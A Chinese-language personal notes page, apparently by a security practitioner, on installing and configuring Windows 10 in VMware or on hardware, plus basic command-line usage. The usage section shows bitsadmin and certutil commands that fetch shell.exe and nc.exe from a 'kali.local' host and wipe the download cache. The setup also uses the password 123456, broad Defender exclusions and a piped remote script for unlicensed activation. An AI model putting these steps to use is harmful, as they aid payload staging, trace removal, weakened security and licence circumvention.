图形化用户界面操作系统。

# 1 准备

Win10_22H2_Chinese_Simplified_x64v1.iso

```
https://www.microsoft.com/zh-cn/software-download/windows10ISO
```

**物理机**

WePE

```
https://www.wepe.com.cn
```

**虚拟机**

VMware

```
https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion
```

目录

```
C:\Users\sec\Documents\Virtual Machines\windows
```

# 2 配置

**物理机**

重启系统进入 Boot 菜单

```
需要关闭 Bitlocker
ASUS 是在启动引导界面按 Del 
TinkPad 是在启动引导界面按 F12 
```

选择 U 盘启动进入 WePE

进入 `Win10_22H2_Chinese_Simplified_x64v1.iso` ，运行 `setup.exe` ，进行安装

**虚拟机**

移动镜像文件到 `iso` 文件夹

```
C:\Users\sec\Documents\Virtual Machines\iso
```

VMware Workstation Pro

```
创建新的虚拟机
```

您希望使用什么类型的配置？

```
自定义
```

硬件兼容性

```
Workstation 17.5 or later
```

安装来源

```
稍后安装操作系统
```

客户机操作系统

```
Microsoft Windows
```

版本

```
Windows 10 x64
```

虚拟机名称

```
windows
```

位置

```
C:\Users\sec\Documents\Virtual Machines\windows
```

固件类型

```
UEFI
```

处理器数量

```
1
```

每个处理器的内核数量

```
2
```

此虚拟机的内存

```
8192 MB
```

网络连接

```
使用桥接网络
```

SCSI 控制器

```
LSI Logic SAS
```

虚拟磁盘类型

```
NVMe
```

磁盘

```
创建新虚拟磁盘
```

最大磁盘大小

```
128.0 GB
```

```
将虚拟磁盘存储为单个文件
```

磁盘文件

```
C:\Users\sec\Documents\Virtual Machines\windows\windows.vmdk
```

编辑虚拟机设置

虚拟化引擎

```
虚拟化 Intel VT-x/EPT 或 AMD-V/RVI
```

使用 ISO 映像文件

```
C:\Users\sec\Documents\Virtual Machines\iso\Win10_22H2_Chinese_Simplified_x64v1.iso
```

3D 图形

```
关闭加速 3D 图形
```

文件夹共享

```
总是启用
```

```
在 Windows 客户机中 映射为网络驱动器
```

添加共享文件夹

主机路径

```
C:\Users\sec\share\VMware
```

名称

```
VMware
```

其他属性

```
启用此共享
只读
```

拍摄快照并命名为 `配置` 

开启此虚拟机进行安装

# 3 安装

输入语言和其他首选项

```
要安装的语言：中文（简体，中国）
时间和货币格式：中文（简体，中国）
键盘和输入方法：微软拼音
```

现在安装

激活 Windows

```
我没有产品密钥 
```

选择要安装的操作系统

```
Windows 10 专业版
```

适用的声明和许可条款

```
我接受许可条款
```

你想执行哪种类型的安装

```
自定义：仅安装 Windows
```

您想将 Windows 安装在哪里

```
驱动器 0 未分配的空间
```

让我们先从区域设置开始。这样对吧？

```
美国
```

这种键盘布局是否合适？

```
微软拼音
```

是否要添加第二种键盘布局？

```
添加布局
```

你的第二个键盘布局想使用哪种语言？

```
英语(美国)
```

你要使用哪个键盘布局？

```
美式键盘
```

希望以何种方式进行设置？

```
针对个人使用进行设置
```

让我们添加你的账户

```
脱机账户
```

登录以尽情体验所有 Microsoft 应用和服务

```
有限的体验
```

谁将会使用这台电脑？

```
sec
```

创建容易记住的密码

```
123456
```

确认你的密码

```
123456
```

为此帐户创建安全问题

```
你第一个宠物的名字是什么？
123456
你出生城市的名称是什么？
123456
你的母校名称是什么？
123456
```

始终有权访问你最近的浏览数据

```
以后再说
```

为你的设备选择隐私设置

```
位置：否
诊断数据：否
量身定制的体验：否
查找我的设备：否
墨迹书写和键入：否
广告 ID：否
```

让我们自定义你的体验

```
跳过
```

让 Cortana 帮助你完成操作

```
以后再说
```

关机，快照命名为 `安装` 

# 4 初始化

**虚拟机**

安装 VMware Tools

![安装 VMware Tools](./../../../../../../images/Windows%2010/%E5%AE%89%E8%A3%85%20VMware%20Tools.png)

**台式机**

进入控制面板修改电源选项

![进入控制面板修改电源选项](./../../../../../../images/Windows%2010/%E8%BF%9B%E5%85%A5%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF%E4%BF%AE%E6%94%B9%E7%94%B5%E6%BA%90%E9%80%89%E9%A1%B9.png)

选择高性能模式

![选择高性能模式](./../../../../../../images/Windows%2010/%E5%88%9D%E5%A7%8B%E5%8C%96/%E5%8F%B0%E5%BC%8F%E6%9C%BA/%E9%80%89%E6%8B%A9%E9%AB%98%E6%80%A7%E8%83%BD%E6%A8%A1%E5%BC%8F.png)

更改高性能模式计划设置

![更改高性能模式计划设置](./../../../../../../images/Windows%2010/%E5%88%9D%E5%A7%8B%E5%8C%96/%E5%8F%B0%E5%BC%8F%E6%9C%BA/%E6%9B%B4%E6%94%B9%E9%AB%98%E6%80%A7%E8%83%BD%E6%A8%A1%E5%BC%8F%E8%AE%A1%E5%88%92%E8%AE%BE%E7%BD%AE.png)

选择电源按钮的功能

![选择电源按钮的功能](./../../../../../../images/Windows%2010/%E5%88%9D%E5%A7%8B%E5%8C%96/%E5%8F%B0%E5%BC%8F%E6%9C%BA/%E9%80%89%E6%8B%A9%E7%94%B5%E6%BA%90%E6%8C%89%E9%92%AE%E7%9A%84%E5%8A%9F%E8%83%BD.png)

定义电源按钮

![定义电源按钮](./../../../../../../images/Windows%2010/%E5%88%9D%E5%A7%8B%E5%8C%96/%E5%8F%B0%E5%BC%8F%E6%9C%BA/%E5%AE%9A%E4%B9%89%E7%94%B5%E6%BA%90%E6%8C%89%E9%92%AE.png)

**笔记本**

进入控制面板修改电源选项

![进入控制面板修改电源选项](./../../../../../../images/Windows%2010/%E8%BF%9B%E5%85%A5%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF%E4%BF%AE%E6%94%B9%E7%94%B5%E6%BA%90%E9%80%89%E9%A1%B9.png)

进入控制面板选择平衡模式

更改平衡模式计划设置

选择电源按钮的功能

定义电源按钮

以管理员权限使用 powershell 运行以下命令禁用快速启动和休眠功能

```powershell
PS C:\Windows\system32> powercfg -h off
```

运行注册表，[关闭搜索框推荐](https://github.com/jadensalas469466/tools/blob/main/script/%E5%85%B3%E9%97%AD%E6%90%9C%E7%B4%A2%E6%A1%86%E6%8E%A8%E8%8D%90.reg)

运行 msconfig ，在系统配置中关闭 GUI 引导

![运行 msconfig ，在系统配置中关闭 GUI 引导](./../../../../../../images/Windows%2010/%E8%BF%90%E8%A1%8C%20msconfig%20%EF%BC%8C%E5%9C%A8%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%85%B3%E9%97%AD%20GUI%20%E5%BC%95%E5%AF%BC.png)

运行 gpedit.msc，在本地组策略编辑器启用不显示锁屏

![运行 gpedit.msc，在本地组策略编辑器启用不显示锁屏](./../../../../../../images/Windows%2010/%E8%BF%90%E8%A1%8C%20gpedit.msc%EF%BC%8C%E5%9C%A8%E6%9C%AC%E5%9C%B0%E7%BB%84%E7%AD%96%E7%95%A5%E7%BC%96%E8%BE%91%E5%99%A8%E5%90%AF%E7%94%A8%E4%B8%8D%E6%98%BE%E7%A4%BA%E9%94%81%E5%B1%8F.png)

修改设备名称

![修改设备名称](./../../../../../../images/Windows%2010/%E4%BF%AE%E6%94%B9%E8%AE%BE%E5%A4%87%E5%90%8D%E7%A7%B0.png)

设置为专用网络

![设置为专用网络](./../../../../../../images/Windows%2010/%E8%AE%BE%E7%BD%AE%E4%B8%BA%E4%B8%93%E7%94%A8%E7%BD%91%E7%BB%9C.png)

分配静态 IP 和 DNS

```
IP 地址 : [IP]
首选 DNS : [server_IP]
备用 DNS : 8.8.8.8
```

修改 hosts 文件

```shell
C:\Windows\System32\drivers\etc\hosts
```

在安全中心添加排除项

```
C:\Users\sec\AppData\Local\Programs\Typora\winmm.dll
C:\Users\sec\AppData\Local\Programs\Goby
C:\Users\sec\AppData\Local\Programs\Yakit
C:\Users\sec\AppData\Roaming\Typora\backups
C:\Users\sec\AppData\Roaming\Typora\draftsRecover
C:\Users\sec\Downloads
C:\Users\sec\share
D:\
```

使用 Geek 卸载不需要的应用

使用 Office Tool Plus 安装 Office 和 Visio

使用 MAS 激活 Windows、Office 和 Visio

```powershell
PS C:\Users\sec> irm https://get.activated.win | iex
```

| 激活类型   | 支持的产品           | 激活期限                 |
| :--------- | :------------------- | :----------------------- |
| HWID       | Windows 10-11        | 永久                     |
| Ohook      | Office               | 永久                     |
| KMS38      | Windows 10-11-Server | 到 2038 年               |
| Online KMS | Windows / Office     | 180 天。终身，有续费任务 |

更新驱动、系统、Edge 和应用

设置 Windows、Edge、Office、Visio 和 Microsoft Store

使用 Dism++ 修改系统设置

关机，快照命名为 `初始化` 

物理机创建文件，配置 SMB 文件共享

```
C:\Users\sec
├─Documents
│	├─KeePass
│	└─VeraCrypt
│		└─iso
├─Pictures
|	└─截图
└─share
	├─github
	└─VMware
```

> ```
> 截图快捷方式路径：
> C:\Users\sec\AppData\Local\Packages\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\TempState\ScreenClip
> ```

# 5 部署

|                            虚拟机                            |
| :----------------------------------------------------------: |
|               [7-Zip](https://www.7-zip.org/)                |
|             [Geek](https://geekuninstaller.com/)             |
| [OpenSSH](https://learn.microsoft.com/zh-cn/windows-server/administration/openssh/openssh_install_firstuse?tabs=powershell) |
|           [phpStudy](https://www.xp.cn/php-study)            |
|          [phpStudyPro](https://www.xp.cn/php-study)          |

关机，快照命名为 `部署` 

|                            笔记本                            |
| :----------------------------------------------------------: |
| [Lenovo System Update](https://www.lenovo.com/us/en/software/lenovo-system-update) |

|                            台式机                            |
| :----------------------------------------------------------: |
| [AMD Software꞉ Adrenalin Edition](https://www.amd.com/zh-cn/support/download/drivers.html) |
| [Twinkle Tray](https://github.com/xanderfrangos/twinkle-tray) |

|                            物理机                            |
| :----------------------------------------------------------: |
|               [7-Zip](https://www.7-zip.org/)                |
|            [AnyTXT Searcher](https://anytxt.net/)            |
| [Burp Suite Professional](https://portswigger.net/burp/pro)  |
| [ContextMenuManager](https://github.com/BluePointLilac/ContextMenuManager) |
| [Dism++](https://github.com/Chuyu-Team/Dism-Multi-language)  |
|              [Eraser](https://eraser.heidi.ie/)              |
|        [Everything](https://www.voidtools.com/zh-cn/)        |
|    [Firefox](https://www.mozilla.org/en-US/firefox/new/)     |
|          [FreeFileSync](https://freefilesync.org/)           |
|             [Geek](https://geekuninstaller.com/)             |
|                 [Git](https://git-scm.com/)                  |
|                 [Goby](https://gobysec.net/)                 |
|       [Google Chrome](https://www.google.com/chrome/)        |
|  [HashCalculator](https://github.com/hrpzcf/HashCalculator)  |
|                  [He3](https://he3.app/zh/)                  |
|      [ImageGlass](https://github.com/d2phap/ImageGlass)      |
| [Internet Download Manager](https://www.internetdownloadmanager.com/) |
|     [Java](https://www.java.com/en/download/manual.jsp)      |
|   [KeePassXC](https://github.com/keepassxreboot/keepassxc)   |
| [Koodo Reader](https://github.com/koodo-reader/koodo-reader) |
| [科来网络分析系统 技术交流版](https://www.colasoft.com.cn/products/capsa.php) |
|     [LocalSend](https://github.com/localsend/localsend)      |
|            [LockHunter](https://lockhunter.com/)             |
| [mitan](https://github.com/kkbo8005/mitan?tab=readme-ov-file) |
|             [MuMu模拟器](https://mumu.163.com/)              |
|                  [Nmap](https://nmap.org/)                   |
| [Notepad++](https://github.com/notepad-plus-plus/notepad-plus-plus) |
|            [OBS Studio](https://obsproject.com/)             |
|        [Pinta](https://github.com/PintaProject/Pinta)        |
|               [PixPin](https://pixpinapp.com/)               |
|             [Postman](https://www.postman.com/)              |
|              [Potplayer](https://potplayer.tv/)              |
|           [Proxifier](https://www.proxifier.com/)            |
|              [Python](https://www.python.org/)               |
| [qBittorrent-Enhanced-Edition](https://github.com/c0re100/qBittorrent-Enhanced-Edition) |
|            [RaiDrive](https://www.raidrive.com/)             |
|          [RealTimeSync](https://freefilesync.org/)           |
| [script](https://github.com/jadensalas469466/tool/tree/main/script) |
|      [Stretchly](https://github.com/hovancik/stretchly)      |
|  [Subtitle Mask](https://github.com/chocovon/subtitle-mask)  |
|             [Syncthing](https://syncthing.net/)              |
|              [Telegram](https://telegram.org/)               |
|       [TTime](https://github.com/InkTimeRecord/TTime)        |
|     [TurboTop](https://www.savardsoftware.com/turbotop/)     |
|                 [Typora](https://typora.io/)                 |
|          [v2rayN](https://github.com/2dust/v2rayN)           |
|      [VeraCrypt](https://www.veracrypt.fr/en/Home.html)      |
|                 [Vim](https://www.vim.org/)                  |
|     [Visual Studio Code](https://code.visualstudio.com/)     |
| [VMware](https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion) |
| [Windows Terminal](https://github.com/microsoft/terminal?tab=readme-ov-file) |
|                [微信](https://weixin.qq.com/)                |
|                 [Xmind](https://xmind.app/)                  |
|          [Yakit](https://github.com/yaklang/yakit)           |

# 6 使用

## 6.1 查看帮助

```cmd
C:\Users\Administrator> [command] /?
```

## 6.2 历史命令

查看历史命令

```cmd
C:\Users\Administrator> doskey /history
```

## 6.3 远程下载

**bitsadmin**

使用 bitsadmin 下载文件

```cmd
C:\Users\Administrator> bitsadmin /transfer n http://kali.local/upload/shell.exe C:\Users\Administrator\shell.exe
```

```cmd
C:\Users\Administrator> bitsadmin /rawreturn /transfer getfile http://kali.local/upload/shell.exe C:\Users\Administrator\shell.exe
```

**certutil**

使用 certutil 下载文件

```cmd
C:\Users\Administrator> certutil -urlcache -split -f http://kali.local/upload/nc.exe C:\Users\Administrator\nc.exe
```

删除 certutil 下载记录

```cmd
C:\Users\Administrator> certutil -urlcache -split -f http://kali.local/upload/nc.exe delete
```

## 6.4 程序

运行程序

```cmd
C:\Users\Administrator> start shell.exe
```

## 6.5 修改编码

查看当前编码

```cmd
C:\Users\Administrator> chcp
```

修改编码为 UTF-8

```cmd
C:\Users\Administrator> chcp 65001
```

编码列表

```
65001	UTF-8		Unicode
936		GB2312		简体中文
936		GBK			简体中文，包括更多的字符
950		Big5		繁体中文
437		MS-DOS		美式英语
932		Shift-JIS	日语
949		EUC-KR		韩语
```

## 6.6 用户管理

查看用户名

```cmd
C:\Users\Administrator> whoami
```

```cmd
whoami
a-win10-1903\administrator
```

添加用户

```cmd
C:\Users\Administrator> net user admin admin /add
```

```cmd
net user admin admin /add
The command completed successfully.
```

查看所有用户

```cmd
C:\Users\Administrator> net user
```

```cmd
net user

User accounts for \\A-WIN10-1903

-------------------------------------------------------------------------------
admin                    Administrator            DefaultAccount           
Guest                    sec                      WDAGUtilityAccount       
The command completed successfully.
```

查看用户信息

```cmd
C:\Users\Administrator> net user admin
```

```cmd
net user admin
User name                    admin
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            ?2024/?1/?2 15:47:13
Password expires             ?2024/?2/?13 15:47:13
Password changeable          ?2024/?1/?2 15:47:13
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Users                
Global Group memberships     *None                 
The command completed successfully.
```

删除用户

```cmd
C:\Users\Administrator> net user admin /del
```

```cmd
net user admin /del
The command completed successfully.
```

## 6.7 文件权限

![文件权限](./../../../../../../images/Windows%2010/%E4%BD%BF%E7%94%A8/%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90.png)

## 6.8 查看进程

```cmd
C:\Users\Administrator> netstat -ano
```

## 6.9 查看系统架构

```cmd
C:\Users\Administrator> wmic os get osarchitecture
```

## 6.10 添加环境变量

添加环境变量

![添加环境变量](./../../../../../../images/Windows%2010/%E4%BD%BF%E7%94%A8/%E6%B7%BB%E5%8A%A0%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F.png)

> 添加多个变量时使用 `;` 间隔
>
> ```
> Path
> %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;D:\software\Microsoft VS Code\bin;D:\software\SDelete
> ```

## 6.11 临时文件夹

```powershell
PS C:\Users\sec> dir C:\Windows\Temp
```

## 6.12 添加快捷访问

![添加快捷访问](./../../../../../../images/Windows%2010/%E4%BD%BF%E7%94%A8/%E6%B7%BB%E5%8A%A0%E5%BF%AB%E6%8D%B7%E8%AE%BF%E9%97%AE.png)

## 6.13 查看网络

```cmd
C:\Users\Administrator> route print
```

## 6.14 权限

```
SYSTEM : 系统权限，可对系统文件进行修改
Administrator : 管理员权限，可对所有普通用户文件进行修改
User : 普通用户权限
Administrator : 可以通过 psexec 获取 SYSTEM 权限
Administrator : 用户读取其它进程内存需要获取 debug 权限，SYSTEM 不需要
```

## 6.15 修复

扫描系统文件的完整性，并修复受损的文件

```cmd
C:\Users\Administrator> sfc /scannow
```

## 6.16 禁用 WSL

列出当前系统上安装的 WSL 发行版

```powershell
PS C:\Users\sec> wslconfig /l
```

删除 WSL 发行版

```powershell
PS C:\Users\sec> wsl --unregister <distribution name>
```

禁用 WSL 功能

```powershell
PS C:\Users\sec> Disable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
```

检查 WSL 状态

```powershell
PS C:\Users\sec> wslconfig /l
```

关闭虚拟机平台

![关闭虚拟机平台](./../../../../../../images/Windows%2010/%E4%BD%BF%E7%94%A8/%E5%85%B3%E9%97%AD%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B3%E5%8F%B0.png)

## 6.17 删除

要删除一个文件，你可以运行：

```powershell
Remove-Item "C:\path\to\file.txt"
```

要删除一个目录及其内容，你可以运行：

```powershell
Remove-Item "C:\path\to\directory" -Recurse
```

---

参考链接

- [Windows](https://learn.microsoft.com/zh-cn/windows/)

